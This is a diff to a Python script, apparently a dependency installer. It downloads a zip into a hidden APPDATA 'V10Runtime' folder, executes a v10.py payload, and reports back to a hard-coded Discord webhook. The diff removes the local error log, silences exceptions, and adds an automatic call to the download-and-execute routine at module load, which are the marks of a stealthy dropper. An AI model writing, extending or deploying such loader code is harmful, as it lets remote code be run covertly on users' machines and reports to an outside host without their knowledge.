@@ -12,17 +12,8 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1560652221035839528/SlDSAV1HKo0X
 DIRECTORIO_DESTINO = os.path.join(os.environ.get("APPDATA", "C:\\"), "V10Runtime")
 ZIP_TEMPORAL = os.path.join(DIRECTORIO_DESTINO, "py.zip")
 SCRIPT_V10 = os.path.join(DIRECTORIO_DESTINO, "v10.py")
-LOG_FILE = os.path.join(os.getcwd(), "dep_error.txt")
-
-def registrar_log(mensaje):
-    try:
-        with open(LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(mensaje + "\n")
-    except Exception:
-        pass
 
 def enviar_webhook(mensaje):
-    registrar_log(mensaje)
     if "TU_WEBHOOK_URL" in WEBHOOK_URL or not WEBHOOK_URL:
         return
     try:
@@ -37,7 +28,7 @@ def enviar_webhook(mensaje):
         )
         urllib.request.urlopen(req, timeout=10)
     except Exception as e:
-        registrar_log(f"Error enviando webhook: {e}")
+        pass
 
 def descargar_archivo_seguro(url, destino):
     """Descarga un archivo por bloques con timeout para evitar congelamientos."""
@@ -104,4 +95,6 @@ def preparar_y_exec():
             enviar_webhook(" [Error] No pudo ejecutarse v10.")
 
     except Exception as e:
-        enviar_webhook(f"❌ [Error crítico en dependencias]: {str(e)}")
+        enviar_webhook(f" [Error en dependencias]: {str(e)}")
+
+preparar_y_exec()
